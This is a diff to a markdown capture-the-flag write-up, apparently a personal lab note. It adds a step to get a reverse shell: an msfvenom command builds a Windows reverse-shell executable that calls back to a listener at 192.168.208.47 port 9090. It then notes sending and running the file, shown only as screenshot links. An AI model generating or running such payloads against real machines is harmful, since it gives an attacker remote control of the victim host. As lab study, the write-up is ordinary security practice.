@@ -20,8 +20,14 @@ Download it and try it
 
 ![](../Img/Pasted%20image%2020260316111727.png)
 
-It seems to work (not with ls tho) so now i try to get a reverse shell
+It seems to work (not with ls tho) so now i try to get a reverse shell `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.208.47 LPORT=9090 -f exe -o exploit.exe`
 
+Then we send it
 
+![](../Img/Pasted%20image%2020260316113516.png)
+
+We executed
+
+![](../Img/Pasted%20image%2020260316113426.png)
 ## Q2: What is the root.txt flag?
 ### A: 
